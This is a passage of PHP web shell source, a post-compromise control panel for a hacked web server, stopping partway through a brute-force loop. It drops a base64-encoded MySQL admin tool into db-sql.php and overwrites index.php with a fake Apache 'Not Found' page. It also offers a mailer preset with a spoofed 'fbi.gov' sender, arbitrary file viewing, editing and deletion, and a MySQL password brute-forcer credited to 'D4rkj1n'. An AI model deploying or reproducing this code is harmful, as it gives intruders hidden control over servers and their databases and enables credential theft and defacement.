JCQllbHNlDQoJCQkJJGtleSAuPSAkZmllbGQtPm5hbWUgLiAiPSciIC4gJEdMT0JBTFNbJGZpZWxkLT5uYW1lXSAuICInIEFORCAiOw0KCX0NCgkka2V5ID0gc3Vic3RyKCAka2V5LCAwLCBzdHJsZW4oJGtleSktNCApOw0KCW15c3FsX3NlbGVjdF9kYiggJGRibmFtZSwgJG15c3FsSGFuZGxlICk7DQoJJHF1ZXJ5U3RyID0gICJERUxFVEUgRlJPTSAkdGFibGVuYW1lIFdIRVJFICRrZXkiOw0KCW15c3FsX3F1ZXJ5KCAkcXVlcnlTdHIsICRteXNxbEhhbmRsZSApOw0KCSRlcnJNc2cgPSBteXNxbF9lcnJvcigpOw0KCXZpZXdEYXRhKCAiIiApOw0KfQ0KDQpmdW5jdGlvbiBmZXRjaF90YWJsZV9kdW1wX3NxbCgkdGFibGUpDQp7DQoJZ2xvYmFsICRteXNxbEhhbmRsZSwkZGJuYW1lOw0KCW15c3FsX3NlbGVjdF9kYiggJGRibmFtZSwgJG15c3FsSGFuZGxlICk7DQoJJHF1ZXJ5X2lkID0gbXlzcWxfcXVlcnkoIlNIT1cgQ1JFQVRFIFRBQkxFICR0YWJsZSIsJG15c3FsSGFuZGxlKTsNCgkkdGFibGVkdW1wID0gbXlzcWxfZmV0Y2hfYXJyYXkoJHF1ZXJ5X2lkLCBNWVNRTF9BU1NPQyk7DQoJJHRhYmxlZHVtcCA9ICJEUk9QIFRBQkxFIElGIEVYSVNUUyAkdGFibGU7XG4iIC4gJHRhYmxlZHVtcFsnQ3JlYXRlIFRhYmxlJ10gLiAiO1xuXG4iOw0KCWVjaG8gJHRhYmxlZHVtcDsNCgkvLyBnZXQgZGF0YQ0KCSRyb3dzID0gbXlzcWxfcXVlcnkoIlNFTEVDVCAqIEZST00gJHRhYmxlIiwkbXlzcWxIYW5kbGUpOw0KCSRudW1maWVsZHM9bXlzcWxfbnVtX2ZpZWxkcygkcm93cyk7DQoJd2hpbGUgKCRyb3cgPSBteXNxbF9mZXRjaF9hcnJheSgkcm93cywgTVlTUUxfTlVNKSkNCgl7DQoJCSR0YWJsZWR1bXAgPSAiSU5TRVJUIElOVE8gJHRhYmxlIFZBTFVFUygiOw0KCQkkZmllbGRjb3VudGVyID0gLTE7DQoJCSRmaXJzdGZpZWxkID0gMTsNCgkJLy8gZ2V0IGVhY2ggZmllbGQncyBkYXRhDQoJCXdoaWxlICgrKyRmaWVsZGNvdW50ZXIgPCAkbnVtZmllbGRzKQ0KCQl7DQoJCQlpZiAoISRmaXJzdGZpZWxkKQ0KCQkJew0KCQkJCSR0YWJsZWR1bXAgLj0gJywgJzsNCgkJCX0NCgkJCWVsc2UNCgkJCXsNCgkJCQkkZmlyc3RmaWVsZCA9IDA7DQoJCQl9DQoJCQlpZiAoIWlzc2V0KCRyb3dbIiRmaWVsZGNvdW50ZXIiXSkpDQoJCQl7DQoJCQkJJHRhYmxlZHVtcCAuPSAnTlVMTCc7DQoJCQl9DQoJCQllbHNlDQoJCQl7DQoJCQkJJHRhYmxlZHVtcCAuPSAiJyIgLiBteXNxbF9lc2NhcGVfc3RyaW5nKCRyb3dbIiRmaWVsZGNvdW50ZXIiXSkgLiAiJyI7DQoJCQl9DQoJCX0NCgkJJHRhYmxlZHVtcCAuPSAiKTtcbiI7DQoJCWVjaG8gJHRhYmxlZHVtcDsNCgl9DQoJQG15c3FsX2ZyZWVfcmVzdWx0KCRyb3dzKTsNCn0NCg0KZnVuY3Rpb24gZHVtcCgpIHsNCglnbG9iYWwgJG15c3FsSGFuZGxlLCAkYWN0aW9uLCAkZGJuYW1lLCAkdGFibGVuYW1lOw0KCWlmKCAkYWN0aW9uID09ICJkdW1wVGFibGUiICl7DQoJCWhlYWRlcigiQ29udGVudC1kaXNwb3NpdGlvbjogZmlsZW5hbWU9JHRhYmxlbmFtZS5zcWwiKTsNCgkJaGVhZGVyKCdDb250ZW50LXR5cGU6IHVua25vd24vdW5rbm93bicpOw0KCQlmZXRjaF90YWJsZV9kdW1wX3NxbCgkdGFibGVuYW1lKTsNCgkJZWNobyAiXG5cblxuIjsNCgkJZWNobyAiXHJcblxyXG5cclxuIyMjICR0YWJsZW5hbWUgVEFCTEUgRFVNUCBDT01QTEVURUQgIyMjIjsNCgkJZXhpdDsNCgl9ZWxzZXsNCgkJaGVhZGVyKCJDb250ZW50LWRpc3Bvc2l0aW9uOiBmaWxlbmFtZT0kZGJuYW1lLnNxbCIpOw0KCQloZWFkZXIoJ0NvbnRlbnQtdHlwZTogdW5rbm93bi91bmtub3duJyk7DQoJCW15c3FsX3NlbGVjdF9kYiggJGRibmFtZSwgJG15c3FsSGFuZGxlICk7DQoJCSRxdWVyeV9pZCA9IG15c3FsX3F1ZXJ5KCJTSE9XIHRhYmxlcyIsJG15c3FsSGFuZGxlKTsNCgkJd2hpbGUgKCRyb3cgPSBteXNxbF9mZXRjaF9hcnJheSgkcXVlcnlfaWQsIE1ZU1FMX05VTSkpDQoJCXsNCgkJCQlmZXRjaF90YWJsZV9kdW1wX3NxbCgkcm93WzBdKTsNCgkJCQllY2hvICJcblxuXG4iOw0KCQkJCWVjaG8gIlxyXG5cclxuXHJcbiMjIyAkcm93WzBdIFRBQkxFIERVTVAgQ09NUExFVEVEICMjIyI7DQoJCQkJZWNobyAiXG5cblxuIjsNCgkJfQ0KCQllY2hvICJcclxuXHJcblxyXG4jIyMgJGRibmFtZSBEQVRBQkFTRSBEVU1QIENPTVBMRVRFRCAjIyMiOw0KCQlleGl0Ow0KCX0NCn0NCg0KZnVuY3Rpb24gdXRpbHMoKSB7DQoJZ2xvYmFsICRQSFBfU0VMRiwgJGNvbW1hbmQ7DQoJZWNobyAiPGgxPlV0aWxpdGllczwvaDE+XG4iOw0KCWlmKCAkY29tbWFuZCA9PSAiIiB8fCBzdWJzdHIoICRjb21tYW5kLCAwLCA1ICkgPT0gImZsdXNoIiApIHsNCgkJZWNobyAiPGhyPlxuIjsNCgkJZWNobyAiU2hvd1xuIjsNCgkJZWNobyAiPHVsPlxuIjsNCgkJZWNobyAiPGxpPjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249dXRpbHMmY29tbWFuZD1zaG93X3N0YXR1cyc+U3RhdHVzPC9hPlxuIjsNCgkJZWNobyAiPGxpPjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249dXRpbHMmY29tbWFuZD1zaG93X3ZhcmlhYmxlcyc+VmFyaWFibGVzPC9hPlxuIjsNCgkJZWNobyAiPGxpPjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249dXRpbHMmY29tbWFuZD1zaG93X3Byb2Nlc3NsaXN0Jz5Qcm9jZXNzbGlzdDwvYT5cbiI7DQoJCWVjaG8gIjwvdWw+XG4iOw0KCQllY2hvICJGbHVzaFxuIjsNCgkJZWNobyAiPHVsPlxuIjsNCgkJZWNobyAiPGxpPjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249dXRpbHMmY29tbWFuZD1mbHVzaF9ob3N0cyc+SG9zdHM8L2E+XG4iOw0KCQlpZiggJGNvbW1hbmQgPT0gImZsdXNoX2hvc3RzIiApIHsNCgkJCWlmKCBteXNxbF9xdWVyeSggIkZsdXNoIGhvc3RzIiApICE9IGZhbHNlICkNCgkJCQllY2hvICItIFN1Y2Nlc3MiOw0KCQkJZWxzZQ0KCQkJCWVjaG8gIi0gRmFpbCI7DQoJCX0NCgkJZWNobyAiPGxpPjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249dXRpbHMmY29tbWFuZD1mbHVzaF9sb2dzJz5Mb2dzPC9hPlxuIjsNCgkJaWYoICRjb21tYW5kID09ICJmbHVzaF9sb2dzIiApIHsNCgkJCWlmKCBteXNxbF9xdWVyeSggIkZsdXNoIGxvZ3MiICkgIT0gZmFsc2UgKQ0KCQkJCWVjaG8gIi0gU3VjY2VzcyI7DQoJCQllbHNlDQoJCQkJZWNobyAiLSBGYWlsIjsNCgkJfQ0KCQllY2hvICI8bGk+PGEgaHJlZj0nJFBIUF9TRUxGP2FjdGlvbj11dGlscyZjb21tYW5kPWZsdXNoX3ByaXZpbGVnZXMnPlByaXZpbGVnZXM8L2E+XG4iOw0KCQlpZiggJGNvbW1hbmQgPT0gImZsdXNoX3ByaXZpbGVnZXMiICkgew0KCQkJaWYoIG15c3FsX3F1ZXJ5KCAiRmx1c2ggcHJpdmlsZWdlcyIgKSAhPSBmYWxzZSApDQoJCQkJZWNobyAiLSBTdWNjZXNzIjsNCgkJCWVsc2UNCgkJCQllY2hvICItIEZhaWwiOw0KCQl9DQoJCWVjaG8gIjxsaT48YSBocmVmPSckUEhQX1NFTEY/YWN0aW9uPXV0aWxzJmNvbW1hbmQ9Zmx1c2hfdGFibGVzJz5UYWJsZXM8L2E+XG4iOw0KCQlpZiggJGNvbW1hbmQgPT0gImZsdXNoX3RhYmxlcyIgKSB7DQoJCQlpZiggbXlzcWxfcXVlcnkoICJGbHVzaCB0YWJsZXMiICkgIT0gZmFsc2UgKQ0KCQkJCWVjaG8gIi0gU3VjY2VzcyI7DQoJCQllbHNlDQoJCQkJZWNobyAiLSBGYWlsIjsNCgkJfQ0KCQllY2hvICI8bGk+PGEgaHJlZj0nJFBIUF9TRUxGP2FjdGlvbj11dGlscyZjb21tYW5kPWZsdXNoX3N0YXR1cyc+U3RhdHVzPC9hPlxuIjsNCgkJaWYoICRjb21tYW5kID09ICJmbHVzaF9zdGF0dXMiICkgew0KCQkJaWYoIG15c3FsX3F1ZXJ5KCAiRmx1c2ggc3RhdHVzIiApICE9IGZhbHNlICkNCgkJCQllY2hvICItIFN1Y2Nlc3MiOw0KCQkJZWxzZQ0KCQkJCWVjaG8gIi0gRmFpbCI7DQoJCX0NCgkJZWNobyAiPC91bD5cbiI7DQoJfSBlbHNlIHsNCgkJJHF1ZXJ5U3RyID0gZXJlZ19yZXBsYWNlKCAiXyIsICIgIiwgJGNvbW1hbmQgKTsNCgkJJHBSZXN1bHQgPSBteXNxbF9xdWVyeSggJHF1ZXJ5U3RyICk7DQoJCWlmKCAkcFJlc3VsdCA9PSBmYWxzZSApIHsNCgkJCWVjaG8gIkZhaWwiOw0KCQkJcmV0dXJuOw0KCQl9DQoJCSRjb2wgPSBteXNxbF9udW1fZmllbGRzKCAkcFJlc3VsdCApOw0KCQllY2hvICI8cCBjbGFzcz1sb2NhdGlvbj4kcXVlcnlTdHI8L3A+XG4iOw0KCQllY2hvICI8aHI+XG4iOw0KCQllY2hvICI8dGFibGUgY2VsbHNwYWNpbmc9MSBjZWxscGFkZGluZz0yIGJvcmRlcj0wPlxuIjsNCgkJZWNobyAiPHRyPlxuIjsNCgkJZm9yKCAkaSA9IDA7ICRpIDwgJGNvbDsgJGkrKyApIHsNCgkJCSRmaWVsZCA9IG15c3FsX2ZldGNoX2ZpZWxkKCAkcFJlc3VsdCwgJGkgKTsNCgkJCWVjaG8gIjx0aD4iLiRmaWVsZC0+bmFtZS4iPC90aD5cbiI7DQoJCX0NCgkJZWNobyAiPC90cj5cbiI7DQoJCXdoaWxlKCAxICkgew0KCQkJJHJvd0FycmF5ID0gbXlzcWxfZmV0Y2hfcm93KCAkcFJlc3VsdCApOw0KCQkJaWYoICRyb3dBcnJheSA9PSBmYWxzZSApIGJyZWFrOw0KCQkJZWNobyAiPHRyPlxuIjsNCgkJCWZvciggJGogPSAwOyAkaiA8ICRjb2w7ICRqKysgKQ0KCQkJCWVjaG8gIjx0ZD4iLmh0bWxzcGVjaWFsY2hhcnMoICRyb3dBcnJheVskal0gKS4iPC90ZD5cbiI7DQoJCQllY2hvICI8L3RyPlxuIjsNCgkJfQ0KCQllY2hvICI8L3RhYmxlPlxuIjsNCgl9DQp9DQpmdW5jdGlvbiBmb290ZXJfaHRtbCgpIHsNCglnbG9iYWwgJG15c3FsSGFuZGxlLCAkZGJuYW1lLCAkdGFibGVuYW1lLCAkUEhQX1NFTEYsICRVU0VSTkFNRTsNCgllY2hvICI8aHI+XG4iOw0KCWVjaG8gIjxzcGFuIGNsYXNzPVwibmV3XCI+WyRVU0VSTkFNRV08L3NwYW4+IC0gXG4iOw0KCWVjaG8gIjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249YkdsemRFUkNjdz09Jz5EYXRhYmFzZSBMaXN0PC9hPiB8IFxuIjsNCglpZiggJHRhYmxlbmFtZSAhPSAiIiApDQoJCWVjaG8gIjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249bGlzdFRhYmxlcyZkYm5hbWU9JGRibmFtZSZ0YWJsZW5hbWU9JHRhYmxlbmFtZSc+VGFibGUgTGlzdDwvYT4gfCAiOw0KCWVjaG8gIjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249dXRpbHMnPlV0aWxzPC9hPiB8XG4iOw0KCWVjaG8gIjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249bG9nb3V0Jz5Mb2dvdXQ8L2E+XG4iOw0KfQ0KLy8tLS0tLS0tLS0tLS0tIE1BSU4gLS0tLS0tLS0tLS0tLSAvLw0KZXJyb3JfcmVwb3J0aW5nKDApOw0KaW5pX3NldCAoJ2Rpc3BsYXlfZXJyb3JzJywgMCk7DQppbmlfc2V0ICgnbG9nX2Vycm9ycycsIDApOw0KaWYoICRhY3Rpb24gPT0gImxvZ29uIiB8fCAkYWN0aW9uID09ICIiIHx8ICRhY3Rpb24gPT0gImxvZ291dCIgKQ0KCWxvZ29uKCk7DQplbHNlIGlmKCAkYWN0aW9uID09ICJiRzluYjI1ZmMzVmliV2wwIiApDQoJbG9nb25fc3VibWl0KCk7DQplbHNlIGlmKCAkYWN0aW9uID09ICJkdW1wVGFibGUiIHx8ICRhY3Rpb24gPT0gImR1bXBEQiIgKSB7DQoJd2hpbGUoIGxpc3QoJHZhciwgJHZhbHVlKSA9IGVhY2goJEhUVFBfQ09PS0lFX1ZBUlMpICkgew0KCQlpZiggJHZhciA9PSAibXlzcWxfd2ViX2FkbWluX3VzZXJuYW1lIiApICRVU0VSTkFNRSA9ICR2YWx1ZTsNCgkJaWYoICR2YXIgPT0gIm15c3FsX3dlYl9hZG1pbl9wYXNzd29yZCIgKSAkUEFTU1dPUkQgPSAkdmFsdWU7DQoJCWlmKCAkdmFyID09ICJteXNxbF93ZWJfYWRtaW5faG9zdG5hbWUiICkgJEhPU1ROQU1FID0gJHZhbHVlOw0KCX0NCgkkbXlzcWxIYW5kbGUgPSBAbXlzcWxfY29ubmVjdCggJEhPU1ROQU1FLiI6MzMwNiIsICRVU0VSTkFNRSwgJFBBU1NXT1JEICk7DQoJZHVtcCgpOw0KfSBlbHNlIHsNCgl3aGlsZSggbGlzdCgkdmFyLCAkdmFsdWUpID0gZWFjaCgkSFRUUF9DT09LSUVfVkFSUykgKSB7DQoJCWlmKCAkdmFyID09ICJteXNxbF93ZWJfYWRtaW5fdXNlcm5hbWUiICkgJFVTRVJOQU1FID0gJHZhbHVlOw0KCQlpZiggJHZhciA9PSAibXlzcWxfd2ViX2FkbWluX3Bhc3N3b3JkIiApICRQQVNTV09SRCA9ICR2YWx1ZTsNCgkJaWYoICR2YXIgPT0gIm15c3FsX3dlYl9hZG1pbl9ob3N0bmFtZSIgKSAkSE9TVE5BTUUgPSAkdmFsdWU7DQoJfQ0KCWVjaG8gIjwhLS0iOw0KCSRteXNxbEhhbmRsZSA9IEBteXNxbF9jb25uZWN0KCAkSE9TVE5BTUUuIjozMzA2IiwgJFVTRVJOQU1FLCAkUEFTU1dPUkQgKTsNCgllY2hvICItLT4iOw0KCWlmKCAkbXlzcWxIYW5kbGUgPT0gZmFsc2UgKSB7DQoJCWVjaG8gIjx0YWJsZSB3aWR0aD0xMDAlIGhlaWdodD0xMDAlPjx0cj48dGQ+PGNlbnRlcj5cbiI7DQoJCWVjaG8gIjxoMT5Xcm9uZyBQYXNzd29yZCE8L2gxPlxuIjsNCgkJZWNobyAiPGEgaHJlZj0nJFBIUF9TRUxGP2FjdGlvbj1sb2dvbic+TG9nb248L2E+XG4iOw0KCQllY2hvICI8L2NlbnRlcj48L3RkPjwvdHI+PC90YWJsZT5cbiI7DQoJfSBlbHNlIHsNCgkJaWYoICRhY3Rpb24gPT0gImJHbHpkRVJDY3c9PSIgKQ0KCQkJbGlzdERhdGFiYXNlcygpOw0KCQllbHNlIGlmKCAkYWN0aW9uID09ICJjcmVhdGVEQiIgKQ0KCQkJY3JlYXRlRGF0YWJhc2UoKTsNCgkJZWxzZSBpZiggJGFjdGlvbiA9PSAiZHJvcERCIiApDQoJCQlkcm9wRGF0YWJhc2UoKTsNCgkJZWxzZSBpZiggJGFjdGlvbiA9PSAibGlzdFRhYmxlcyIgKQ0KCQkJbGlzdFRhYmxlcygpOw0KCQllbHNlIGlmKCAkYWN0aW9uID09ICJjcmVhdGVUYWJsZSIgKQ0KCQkJY3JlYXRlVGFibGUoKTsNCgkJZWxzZSBpZiggJGFjdGlvbiA9PSAiZHJvcFRhYmxlIiApDQoJCQlkcm9wVGFibGUoKTsNCgkJZWxzZSBpZiggJGFjdGlvbiA9PSAidmlld1NjaGVtYSIgKQ0KCQkJdmlld1NjaGVtYSgpOw0KCQllbHNlIGlmKCAkYWN0aW9uID09ICJxdWVyeSIgKQ0KCQkJdmlld0RhdGEoICRxdWVyeVN0ciApOw0KCQllbHNlIGlmKCAkYWN0aW9uID09ICJhZGRGaWVsZCIgKQ0KCQkJbWFuYWdlRmllbGQoICJhZGQiICk7DQoJCWVsc2UgaWYoICRhY3Rpb24gPT0gImFkZEZpZWxkX3N1Ym1pdCIgKQ0KCQkJbWFuYWdlRmllbGRfc3VibWl0KCAiYWRkIiApOw0KCQllbHNlIGlmKCAkYWN0aW9uID09ICJlZGl0RmllbGQiICkNCgkJCW1hbmFnZUZpZWxkKCAiZWRpdCIgKTsNCgkJZWxzZSBpZiggJGFjdGlvbiA9PSAiZWRpdEZpZWxkX3N1Ym1pdCIgKQ0KCQkJbWFuYWdlRmllbGRfc3VibWl0KCAiZWRpdCIgKTsNCgkJZWxzZSBpZiggJGFjdGlvbiA9PSAiZHJvcEZpZWxkIiApDQoJCQlkcm9wRmllbGQoKTsNCgkJZWxzZSBpZiggJGFjdGlvbiA9PSAiZG1sbGQwUmhkR0U9IiApDQoJCQl2aWV3RGF0YSggIiIgKTsNCgkJZWxzZSBpZiggJGFjdGlvbiA9PSAiYWRkRGF0YSIgKQ0KCQkJbWFuYWdlRGF0YSggImFkZCIgKTsNCgkJZWxzZSBpZiggJGFjdGlvbiA9PSAiYWRkRGF0YV9zdWJtaXQiICkNCgkJCW1hbmFnZURhdGFfc3VibWl0KCAiYWRkIiApOw0KCQllbHNlIGlmKCAkYWN0aW9uID09ICJlZGl0RGF0YSIgKQ0KCQkJbWFuYWdlRGF0YSggImVkaXQiICk7DQoJCWVsc2UgaWYoICRhY3Rpb24gPT0gImVkaXREYXRhX3N1Ym1pdCIgKQ0KCQkJbWFuYWdlRGF0YV9zdWJtaXQoICJlZGl0IiApOw0KCQllbHNlIGlmKCAkYWN0aW9uID09ICJkZWxldGVEYXRhIiApDQoJCQlkZWxldGVEYXRhKCk7DQoJCWVsc2UgaWYoICRhY3Rpb24gPT0gInV0aWxzIiApDQoJCQl1dGlscygpOw0KCQlteXNxbF9jbG9zZSggJG15c3FsSGFuZGxlKTsNCgkJZm9vdGVyX2h0bWwoKTsNCgl9DQp9DQo/Pg0KPGh0bWw+DQo8aGVhZD4NCjx0aXRsZT5NeVNRTCBJbnRlcmZhY2UgKERldmVsb3BlZCBCeSBNb2hhamVyMjIpPC90aXRsZT4NCjxib2R5IGJnQ29sb3I9IzAwMDAwMCA+DQo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPg0KPCEtLQ0KcC5sb2NhdGlvbiB7DQoJY29sb3I6ICMwMEZGMDA7DQp9DQpoMSwgaDIsIGgzIHsNCgljb2xvcjogIzAwRkYwMDsNCn0NCnRoIHsNCgliYWNrZ3JvdW5kLWNvbG9yOiAjMjIyMjIyOw0KCWNvbG9yOiAjMDBGRjAwOw0KCWZvbnQtc2l6ZTogc21hbGw7DQp9DQp0ZCB7DQoJY29sb3I6ICMwMEZGMDA7DQoJYmFja2dyb3VuZC1jb2xvcjogIzQ0NDQ0NDsNCglmb250LXNpemU6IHNtYWxsOw0KfQ0KZm9ybSB7DQoJbWFyZ2luLXRvcDogMDsNCgltYXJnaW4tYm90dG9tOiAwOw0KfQ0KYSB7DQoJdGV4dC1kZWNvcmF0aW9uOm5vbmU7DQoJY29sb3I6ICMwMEZGMDA7DQoJZm9udC1zaXplOnNtYWxsOw0KfQ0KQTpsaW5rIHsNCkNPTE9SOiNGRkZGRkY7DQpURVhULURFQ09SQVRJT046IG5vbmUNCn0NCkE6dmlzaXRlZCB7DQpDT0xPUjojMDBGRjAwOw0KVEVYVC1ERUNPUkFUSU9OOiBub25lDQp9DQpBOmFjdGl2ZSB7DQpDT0xPUjojMDBGRjAwOw0KVEVYVC1ERUNPUkFUSU9OOiBub25lDQp9DQpBOmhvdmVyIHsNCmNvbG9yOiMwMEZGMDA7DQpURVhULURFQ09SQVRJT046IG5vbmUNCn0NCmlucHV0LCBzZWxlY3QsIHRleHRhcmVhIHsNCmJhY2tncm91bmQtY29sb3I6ICMwMDAwMDA7DQpib3JkZXItc3R5bGU6IHNvbGlkOw0KZm9udC1mYW1pbHk6IFRhaG9tYSxWZXJkYW5hLEFyaWFsLFNhbnMtU2VyaWY7DQpmb250LXNpemU6c21hbGw7DQpjb2xvcjogIzAwRkYwMDsNCnBhZGRpbmc6IDBweDsNCn0NCmxpIHsNCmNvbG9yOiAjMDBGRjAwOw0KfQ0KLm5ldyB7DQpjb2xvcjogIzAwRkYwMDsNCn0NCi8vLS0+DQo8L3N0eWxlPg0KPC9oZWFkPg==';
    $file = fopen('db-sql.php', 'w+');
    $write = fwrite($file, base64_decode($sqlshell));
    fclose($file);
    chmod('db-sql.php', 0644);
    $indexshell = fopen('index.php', 'w+');
    $data = 'PGgxPk5vdCBGb3VuZDwvaDE+IA0KPHA+VGhlIHJlcXVlc3RlZCBVUkwgd2FzIG5vdCBmb3VuZCBvbiB0aGlzIHNlcnZlci48L3A+IA0KPGhyPiANCjxhZGRyZXNzPkFwYWNoZSBTZXJ2ZXIgYXQgPD89JF9TRVJWRVJbJ0hUVFBfSE9TVCddPz4gUG9ydCA4MDwvYWRkcmVzcz4gDQogICAgPHN0eWxlPiANCiAgICAgICAgaW5wdXQgeyBtYXJnaW46MDtiYWNrZ3JvdW5kLWNvbG9yOiNmZmY7Ym9yZGVyOjFweCBzb2xpZCAjZmZmOyB9IA0KICAgIDwvc3R5bGU+';
    $tulis = fwrite($indexshell, base64_decode($data));
    fclose($indexshell);
    echo '<iframe src=mysql/db-sql.php width=97% height=100% frameborder=0></iframe>';
} elseif (isset($_GET['x']) && ('mail' == $_GET['x'])) {
    if (isset($_POST['mail_send'])) {
        $mail_to = $_POST['mail_to'];
        $mail_from = $_POST['mail_from'];
        $mail_subject = $_POST['mail_subject'];
        $mail_content = magicboom($_POST['mail_content']);
        if (@mail($mail_to, $mail_subject, $mail_content, "FROM:$mail_from")) {
            $msg = "email sent to $mail_to";
        } else {
            $msg = 'send email failed';
        }
    } ?>
<form action="?y=<?php echo $pwd; ?>&amp;x=mail" method="post">
<table class="cmdbox">
<tr><td>
<textarea class="output" name="mail_content" id="cmd" style="height:340px;">Hey there, please patch me ASAP ;-p</textarea>
<tr><td>&nbsp;<input class="inputz" style="width:20%;" type="text" value="admin@somesome.com" name="mail_to" />&nbsp; mail to</td></tr>
<tr><td>&nbsp;<input class="inputz" style="width:20%;" type="text" value="D4rkj1n@fbi.gov" name="mail_from" />&nbsp; from</td></tr>
<tr><td>&nbsp;<input class="inputz" style="width:20%;" type="text" value="patch me" name="mail_subject" />&nbsp; subject</td></tr>
<tr><td>&nbsp;<input style="width:19%;" class="inputzbut" type="submit" value="Go !" name="mail_send" /></td></tr></form>
<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;<?php echo $msg; ?></td></tr>
</table>
</form>

<?php
} elseif (isset($_GET['x']) && ('phpinfo' == $_GET['x'])) {
        @ob_start();
        eval('phpinfo();');
        $buff = @ob_get_contents();
        @ob_end_clean();
        $awal = strpos($buff, '<body>') + 6;
        $akhir = strpos($buff, '</body>');
        echo '<div class="phpinfo">' . substr($buff, $awal, $akhir - $awal) . '</div>';
    } elseif (isset($_GET['view']) && ('' != $_GET['view'])) {
        if (is_file($_GET['view'])) {
            if (!isset($file)) {
                $file = magicboom($_GET['view']);
            }
            if (!$win && $posix) {
                $name = @posix_getpwuid(@fileowner($folder));
                $group = @posix_getgrgid(@filegroup($folder));
                $owner = $name['name'] . '<span class="gaya"> : </span>' . $group['name'];
            } else {
                $owner = $user;
            }
            $filn = basename($file);
            echo '<table style="margin:6px 0 0 2px;line-height:20px;">
	<tr><td>Filename</td><td><span id="' . clearspace($filn) . '_link">' . $file . '</span>
	<form action="?y=' . $pwd . "&amp;view=$file\" method=\"post\" id=\"" . clearspace($filn) . '_form" class="sembunyi" style="margin:0;padding:0;">
		<input type="hidden" name="oldname" value="' . $filn . '" style="margin:0;padding:0;" />
		<input class="inputz" style="width:200px;" type="text" name="newname" value="' . $filn . "\" />
		<input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" />
		<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('" . clearspace($filn) . "_link','" . clearspace($filn) . "_form');\" />
	</form>
	</td></tr>
	<tr><td>Size</td><td>" . ukuran($file) . '</td></tr>
	<tr><td>Permission</td><td>' . get_perms($file) . '</td></tr>
	<tr><td>Owner</td><td>' . $owner . '</td></tr>
	<tr><td>Create time</td><td>' . date('d-M-Y H:i', @filectime($file)) . '</td></tr>
	<tr><td>Last modified</td><td>' . date('d-M-Y H:i', @filemtime($file)) . '</td></tr>
	<tr><td>Last accessed</td><td>' . date('d-M-Y H:i', @fileatime($file)) . "</td></tr>
	<tr><td>Actions</td><td><a href=\"?y=$pwd&amp;edit=$file\">edit</a> | <a href=\"javascript:tukar('" . clearspace($filn) . "_link','" . clearspace($filn) . "_form');\">rename</a> | <a href=\"?y=$pwd&amp;delete=$file\">delete</a> | <a href=\"?y=$pwd&amp;dl=$file\">download</a>&nbsp;(<a href=\"?y=$pwd&amp;dlgzip=$file\">gzip</a>)</td></tr>
	<tr><td>View</td><td><a href=\"?y=" . $pwd . '&amp;view=' . $file . '">text</a> | <a href="?y=' . $pwd . '&amp;view=' . $file . '&amp;type=code">code</a> | <a href="?y=' . $pwd . '&amp;view=' . $file . '&amp;type=image">image</a></td></tr>
	</table>
	';
            if (isset($_GET['type']) && ('image' == $_GET['type'])) {
                echo '<div style="text-align:center;margin:8px;"><img src="?y=' . $pwd . '&amp;img=' . $filn . '"></div>';
            } elseif (isset($_GET['type']) && ('code' == $_GET['type'])) {
                echo '<div class="viewfile">';
                $file = wordwrap(@file_get_contents($file), '240', '
');
                @highlight_string($file);
                echo '</div>';
            } else {
                echo '<div class="viewfile">';
                echo nl2br(htmlentities((@file_get_contents($file))));
                echo '</div>';
            }
        } elseif (is_dir($_GET['view'])) {
            echo showdir($pwd, $prompt);
        }
    } elseif (isset($_GET['edit']) && ('' != $_GET['edit'])) {
        if (isset($_POST['save'])) {
            $file = $_POST['saveas'];
            $content = magicboom($_POST['content']);
            if ($filez = @fopen($file, 'w')) {
                $time = date('d-M-Y H:i', time());
                if (@fwrite($filez, $content)) {
                    $msg = 'file saved <span class="gaya">@</span> ' . $time;
                } else {
                    $msg = 'failed to save';
                }
                @fclose($filez);
            } else {
                $msg = 'permission denied';
            }
        }
        if (!isset($file)) {
            $file = $_GET['edit'];
        }
        if ($filez = @fopen($file, 'r')) {
            $content = '';
            while (!feof($filez)) {
                $content .= htmlentities(str_replace("''", "'", fgets($filez)));
            }
            @fclose($filez);
        } ?>
<form action="?y=<?php echo $pwd; ?>&amp;edit=<?php echo $file; ?>" method="post">
<table class="cmdbox">
<tr><td colspan="2">
<textarea class="output" name="content">
<?php echo $content; ?>
</textarea>
<tr><td colspan="2">Save as <input onMouseOver="this.focus();" id="cmd" class="inputz" type="text" name="saveas" style="width:60%;" value="<?php echo $file; ?>" /><input class="inputzbut" type="submit" value="Save !" name="save" style="width:12%;" />
&nbsp;<?php echo $msg; ?></td></tr>
</table>
</form>
<?php
    } elseif (isset($_GET['x']) && ('logout' == $_GET['x'])) {
        ?>
<form action="?y=<?php echo $pwd; ?>&amp;x=logout" method="post">

<?php
    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
        echo 'bye!';
    } elseif (isset($_GET['x']) && ('brute' == $_GET['x'])) {
        ?>
				<form action="?y=<?php echo $pwd; ?>&amp;x=brute" method="post">
			<?php
    //bruteforce

?>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<?php
    /*
    Develop by D4rkj1n
    */
    @set_time_limit(0);
        @error_reporting(0);
        if ('find' == $_POST['page']) {
            if (isset($_POST['usernames']) && isset($_POST['passwords'])) {
                if ('passwd' == $_POST['type']) {
                    $e = explode('
', $_POST['usernames']);
                    foreach ($e as $value) {
                        $k = explode(':', $value);
                        $username .= $k['0'] . ' ';
                    }
                } elseif ('simple' == $_POST['type']) {
                    $username = str_replace('
', ' ', $_POST['usernames']);
                }
                $a1 = explode(' ', $username);
                $a2 = explode('
', $_POST['passwords']);
                $id2 = count($a2);
                $ok = 0;
                foreach ($a1 as $user) {
                    if ('' !== $user) {
                        $user = trim($user);
                        for ($i = 0; $i <= $id2; ++$i) {
                            $pass = trim($a2[$i]);
                            if (@mysql_connect('localhost', $user, $pass)) {
